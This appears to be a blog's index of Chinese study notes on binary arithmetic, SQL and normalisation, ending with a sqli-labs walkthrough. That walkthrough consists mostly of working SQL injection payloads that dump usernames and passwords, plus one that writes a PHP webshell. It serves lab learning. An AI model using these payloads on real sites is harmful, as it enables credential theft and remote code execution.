补码的减法运算\n[A]补−[B]补=[A]补+[−B]补[A]_补-[B]_补=[A]_补+[-B]_补[A]补​−[B]补​=[A]补​+[−B]补​\n[B]补[B]_补[B]补​转[−B]补[-B]_补[−B]补​：全部位按位取反（包括符号位），末位加 1\n\n或者：找第一个 1，左边全部取反，右边不变\n例 1：19-19\n\nC 语言中 int 等带符号整数是用补码来表示的\n# 原 / 反 / 补码特性对比\n小题常见考点\n\n\n原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；\n补码的合法表示范围比原码多一个负数，只有一种方式表示真值 0：\n\n如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127\n补码中 - 128 的表示为：1,0000000；\n原码能表示的最小的值 - 127：1,1111111；\n-128 不能转为 - 127\n补码的真值 0 表示方法：0,0000000\n\n常见考点：A 和 B 进行某种运算后，是否发生溢出 —— 手算做题可以带入十进制验证是否超出合法范围\n# 移码表示\n\n移码：在补码的基础上符号位取反就是移码，移码只能用来表示整数\n移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000\n\n\n# 定点小数的表示和运算\n定点：小数点的符号固定\n\n# 定点小数反码、补码的转换\n\n# 定点小数的加 / 减运算\n\n# 定点小数与定点整数的区别\n\n定点小数在位数扩展时，拓展位置不一样，要加在右边\n定点小数带符号与不带符号的加法减法与定点整数一样\n# 奇偶校验码\n\n\n# 算术逻辑单元 ALU\n\n\n算术运算：加减乘除等\n逻辑运算：与或非异或等\n辅助功能：移位、求补等\n\n\n# 最基本的逻辑运算\n\n在一个复杂的逻辑表达式中，与运算的优先级大于或运算的优先级 —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律\n\nA (C+D) = AC + AD —— 分配率\nABC = A (BC) —— 结合律\nA + B + C = A + (B + C) —— 结合律\n\n\n本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计\n# 复合逻辑\n\n与非就是先与再非，或非就是先或再非\n反演律：\n\nA 或 B 的非等于 A 的非与 B 的非\nA 与 B 的非等于 A 的非或 B 的非\n\n同或 ： 异或取反\n\n# 用门电路求偶校验位\n\n# 一位全加器\n\n# 串行加法器\n\n# 串行进位的并行加法器\n\n串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的\n\n# 并行进位加法器\n以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。\n每个进位产生的逻辑表达式:Ci=AiBi+(Ai⨁Bi)Ci−1C_i = A_iB_i + (A_i \\bigoplus B_i )C_{i-1}Ci​=Ai​Bi​+(Ai​⨁Bi​)Ci−1​，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开\n\n\n这种加法器的设计每个位的进位几乎是同时产生的\n不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算\n# 补码加减运算器\n加法器原理\n\n补码加 / 减法运算\n\nn bit 补码 X+Y，按位相加即可\nn bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法\n\n\n无符号整数的加 / 减法也可以用该电路实现\n\n无符号数 X+Y，按位相加即可\n无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法\n\n补码加减运算和无符数的加减运算都可以用同一个运算器实现，但是溢出位的判断不同\n所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理\n# 标志位的生成\n\n加法器输出四个标志位的信息\n\nOF：溢出标志，只在有符号数的加减运算时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）\n\nOF 的硬件逻辑：OF = 最高位的进位异或次高位的进位\n在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的\n\nSF：符号标志，运算结果为正则置为 0，结果为负则置为 1\n\nSF 的硬件计算方法：SF = 最高位的本位和\nSF 位对无符号数的加减法无意义\n\nZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0\n\n对有符号数和无符号数都有意义\n\nCF：进位 / 错位标志，进位 / 错位时置 1，否则置 0\n\nCF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义\n\n\n\n产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出\n\n有符号整数加减运算是否产生了溢出要看 OF 位，无符号整数加减运算是否产生溢出要看 CF 位\n","slug":"计算机组成原理-数据的表示和运算","date":"2022-06-11T03:21:41.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"6b01e0a1bee5e460cbe53bebb203270e","title":"数据库-关系数据库标准语言SQL","content":"# 3.3 数据定义\n# 3.3.1 模式的定义与删除\n# 1. 定义模式\ncreate schema &lt;模式名> authorization &lt;用户名>\n例 3.1：为用户 WANG 定义一个学生 - 课程模式 S-T\ncreate schema \"S-T\" authorization WANG;\n# 2. 删除模式\ndrop schema &lt;模式名> &lt;cascade|restrict>\n# 3.3.2 基本表的定义、删除与修改\n# 1. 定义基本表\n例 3.5：建立一个学生表 Student\ncreate table student(\n    sco char(9) primary key,\n    sname char(20) unique,\n    ssex char(2),\n    sage smallint,\n    sdept char(20)\n);\n# 2. 数据类型\n# 3. 模式与表\n# 4. 修改基本表\n例 3.8：向 Student 表增加” 入学时间 “列，其数据类型为日期型\nalter table Student add S_entrance DATE;\n例 3.9：将年龄的数据类型由字符型（假设原来的数据类型是字符型）改为整数\nalter table Student alter column Sage INT;\n例 3.10：增加课程名称必须取唯一值的约束条件\nalter table Student add unique(Cname);\n# 5. 删除基本表\n例 3.11：删除 Student 表\ndrop table Student cascade;\n# 3.3.3 索引的建立与删除\n# 1. 建立索引\n在 SQL 语言中，建立索引使用 CREATE INDEX 语句，其一般格式为：\nCREATE [UNIQUE][CLUSTER] INDEX 索引名 ON &lt;表名&gt;(&lt;列名&gt;[&lt;次序&gt;])\n例 3.13：为学生 - 课程数据库中的 Student、Course 和 SC 三个表建立索引。其中 Student 表按学号升序建唯一索引，Course 表按课程号升序建唯一索引，SC 表按学号升序和课程号降序建唯一索引。\ncreate unique index stusno on student(Sno);\nCREATE UNIQUE INDEX Coucno ON Course(Cno);\nCREATE UNIQUE INDEX SCno ON SC(Sno ASC, Cno DESC);\n# 2. 修改索引\n例 3.14：将 SC 表的 SCno 索引名改为 SCSno\nALTER INDEX SCno RENAME TO SCSno;\n# 3. 删除索引\nDROP INDEX Stusname;\n# 3.4 数据查询\n","slug":"数据库-关系数据库标准语言SQL","date":"2022-06-09T11:13:01.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"7c1208209b9fd71ae4c371be24b134d7","title":"数据库-关系数据理论","content":"# 6.1 问题的提出\nR(U,D,DOM,F)：\n\n关系明 R 是符号化的元组语义\nU 为一组属性\nD 为属性组 U 中的属性所来自的域\nDOM 为属性到域的映射\nF 为属性组 U 上的一组数据依赖\n\n第一范式：每一个分量必须是不可分割的数据项\n数据依赖是一个关系内部属性与属性之间的一种约束关系，是通过属性间值的相等与否体现出来的数据间相关联系。其中最重要的是函数依赖和多值依赖。\n函数依赖：比如描述一个学生的关系，可以有学号 (sno)，姓名 (sname)，系名 (sdept) 等几个属性。由于一个学号只对应一个学生，一个学生只在一个系学习。因而当” 学号 “的值确定之后，学生的姓名及所在的系值也就被唯一地确定了。类似的有Sname=f(sno)Sname = f(sno)Sname=f(sno)，Sdept=f(Sno)Sdept = f(Sno)Sdept=f(Sno)，即 sno 函数决定 sname，或者说 sname 函数依赖于 sno。记作Sno→SnameSno \\rightarrow SnameSno→Sname。\n一个学生例子：F=\\\n但是这个关系存在以下的问题：\n\n数据冗余\n\n如一个系的系主任名重复出现\n\n\n更新异常\n插入异常\n删除异常\n\n将这个单一的模式改造如下，分成三个关系模式：\n\nS(Sno,Sdept,Sno→Sdept)S(Sno,Sdept,Sno \\rightarrow Sdept )S(Sno,Sdept,Sno→Sdept)\nSC(Sno,Cno,Grade,(Sno,Cno)→Grade)SC(Sno,Cno,Grade,(Sno,Cno) \\rightarrow Grade)SC(Sno,Cno,Grade,(Sno,Cno)→Grade)\nDEPT(Sdept,Mname,Sdept→Mname)DEPT(Sdept,Mname,Sdept \\rightarrow Mname)DEPT(Sdept,Mname,Sdept→Mname)\n\n# 6.2 规范化\n通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。\n# 6.2.1 函数依赖\n定义 6.1：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作X→YX \\rightarrow YX→Y。\n函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名→\\rightarrow→ 年龄这个函数依赖只有在该部门没有同名人的条件下成立。\n下面介绍一些术语和记号：\n\nX→YX \\rightarrow YX→Y，但 Y 不属于 X，则称X→YX \\rightarrow YX→Y 是非平凡的函数依赖。\nX→YX \\rightarrow YX→Y，但 Y 属于 X，则称X→YX \\rightarrow YX→Y 是平凡的函数依赖。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。\n若X→YX \\rightarrow YX→Y，则称 X 为这个函数依赖的决定属性组，也称为决定因素。\n若X→YX \\rightarrow YX→Y，Y→XY \\rightarrow XY→X，则记作X←→YX \\leftarrow \\rightarrow YX←→Y。\n若 Y 不函数依赖于 X，则记作X→YX \\rightarrow YX→Y，箭头加斜线\n\n定义 6.2：在 R (U) 中，如果X→YX \\rightarrow YX→Y，并且对于 X 的任何一个真子集X′X&#x27;X′，都有X′X&#x27;X′ 不函数依赖于YYY，则称 Y 对 X 完全函数依赖，记作 —&gt;F\n定义 6.3：传递函数依赖\n# 6.2.2 码\n码是关系模式中的一个重要概念。\n定义 6.4：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的候选码。\n注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，如果 U 函数依赖于 K，即K→UK \\rightarrow UK→U，则 K 称为超码。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。\n若候选码多于一个，则选定其中的一个为主码。\n包含在任何一个候选码中的属性称为主属性；不包含在任何候选码中的属性称为非主属性或非码属性。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为全码。\n定义 6.5：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的外部码，也称外码。\n# 6.2.3 范式\n关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。\n一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫规范化。\n# 6.2.4 2NF\n定义 6.6：若R∈1NFR\\in 1NFR∈1NF，且每一个非主属性完全函数依赖于任何一个候选码，则R∈2NFR\\in 2NFR∈2NF。\n# 6.3 数据依赖的公理系统\n定义 6.11：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖X→YX \\rightarrow YX→Y 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称 F 逻辑蕴含X→YX \\rightarrow YX→Y.\n公理系统设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：\n\nA1 自反律\nA2 增广率\nA3 传递率\n\n定义 6.13：设 F 为属性集 U 上的一组函数依赖，X、Y⊆\\subseteq⊆U，XF+={A∣X→A能由F根据Armstrong公理导出}X^+_{F}=\\{A|X \\rightarrow A 能由F根据Armstrong 公理导出\\}XF+​={A∣X→A能由F根据Armstrong公理导出}，XF+X^+_FXF+​ 称为属性集 X 关于函数依赖集 F 的闭包。\n","slug":"数据库-关系数据理论","date":"2022-06-08T13:12:23.000Z","categories_index":"数据库","tags_index":"数据库","author_index":"cCor4ng3"},{"id":"1b32940dd409c0fe09232e5ee728ee0b","title":"sqli-labs笔记","content":"测试上线使用\n注意点：PHP 要使用低版本，高版本无法安装\thttps://github.com/Audi-1/sqli-labs\n# 相关知识点\n\n\n\n\n\n\n\n\n\n信息收集知识点：\n数据库版本：version ()\t 5.7.22-0ubuntu0.16.04.1\n数据库用户：user ()\t\t root@localhost\n数据库名字：database ()\t mozhe_Discuz_StormGroup\n操作系统：@@version_compile_os\t Linux\n版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）\n\n\n\n\n\n\n\n\n\n读写文件操作 (mysql 特有功能)\nload_file (): 文件读取函数\ninto outfile 或 into dumpfile：导出函数\n使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加\n# less 01\n\n经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;\n\n\n\n但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题\n\n\n\n判断出字段共有三列，判断回显位置\n\n\n\n查询数据库和当前用户名\n\n\n\n以下为 payload，依次使用即可\n\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = \"security\"--+ #爆破表名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #爆破列名\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据\n\n# less 02\n\nless 02 经测试为无引号包裹\n\n\n\n测试字段数\n\n\n\n信息收集\n\n\n\npayload\n\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"#  #获取表名\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"# #获取字段\nhttp://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users# #获取数据\n\n# less 03\n\n判断闭合方式为双引号\n\n\n\n确定字段数时出现问题，发现后面有一个括号\n\n\n\n经过尝试发现 id 的闭合方法应该为’)，注意注释方法要多试几次，不知道抽什么疯，payload:   ?id=1') order by 4-+\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(table_name),user() from information_schema.tables where table_schema = \"security\"--+ #查表\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(column_name),user() from information_schema.columns where table_name = \"users\" and table_schema = \"security\"--+ #获取字段名\nhttp://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users--+ #数据\n\n# less 04\n\n测试注入点，发现这里还是有一个括号干扰\n\n\n\n最终发现注入点的 payload 为： http://127.0.0.1/sqli-labs/Less-4/?id=1&quot;) and 1=1--+\n\n\n\n判断字段数\n\n\n\n判断回显位置\n\n\n\npayload：\n\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,database(),user()--+ #信息收集\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=\"security\"--+ #获取表名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(column_name),user() from information_schema.columns where table_name=\"users\" and table_schema=\"security\"--+ #获取列名\nhttp://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,group_concat(username),group_concat(password) from users--+ #获取数据\n\n# less 05\n# 1、布尔盲注 —— 使用 left 进行尝试\n\n利用 left 函数判断数据库版本。下面语句是判断版本的第一个字符是否是 5，发现正常返回结果，如果结果不正常是不能返回 you are in 的\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),1)=5--+\n\n\n使用 length 函数判断数据库名称的长度，发现到 8 时正常返回，说明数据库名称的长度为 8\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+\n\n\n使用 left 函数猜测数据库第一位，当试到 s 时正确显示，说明数据库名称的第一位是 s，继续测试出第二位是 e\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)=\"s\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)=\"se\"--+\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),2)>\"se\"--+ #使用ascii的值对字符进行判断\n\n# 2、报错注入\n\npayload 如下，使用 updatexml 函数\n\n#获取当前数据库名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+\n#获取当前数据库所有表名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有列名称\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)--+\n#获取当前数据库user表所有username和password的值\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)--+\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)--+\n#下面这步写webshell\nhttp://192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e--+\n \n\n本关为无回显注入\n\n\n\n判断闭合方式为单引号\n\n\n\n获取数据库\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select database()))))--+\n\n\n获取表名\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+\n\n\n获取字段名\n\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot; and table_schema&#x3D;database()))))--+\n\n\n获取数据\n\nhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)--+\n#1依次加31即可\n\n","slug":"sqli-labs笔记","date":"2022-06-07T06:44:48.000Z","categories_index":"web安全","tags_index":"web安全,测试","author_index":"cCor4ng3"}]